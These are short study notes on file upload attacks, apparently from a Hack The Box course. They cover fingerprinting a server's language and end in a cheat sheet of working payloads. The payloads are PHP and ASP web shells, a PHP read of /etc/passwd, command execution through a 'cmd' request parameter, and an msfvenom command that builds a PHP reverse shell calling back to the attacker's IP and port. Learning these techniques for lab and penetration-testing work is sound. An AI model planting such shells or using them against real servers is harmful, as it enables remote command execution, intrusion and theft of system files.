# File upload attacks notes

One easy method to determine what language runs the web application is to visit the /index.ext page, where we would swap out ext with various common web extensions, like php, asp, aspx, among others, to see whether any of them exist.

We can use a fuzzer to identify this as well

To test if we can abuse php site with a webshell we can save a file with this to upload:

```
<?php echo "Hello HTB";?>
```

## Cheat Sheets

|Web Shell 	|Description|
|:----|:----|
|\<?php file_get_contents('/etc/passwd'); ?> 	|Basic PHP File Read|
|\<?php system('hostname'); ?> 	|Basic PHP Command Execution|
|\<?php system($_REQUEST['cmd']); ?> |	Basic PHP Web Shell|
|\<% eval request('cmd') %> |	Basic ASP Web Shell|
|msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php 	|Generate PHP reverse shell|
|PHP Web Shell| 	PHP Web Shell|
|PHP Reverse Shell |	PHP Reverse Shell|
|Web/Reverse Shells |	List of Web Shells and Reverse Shells|
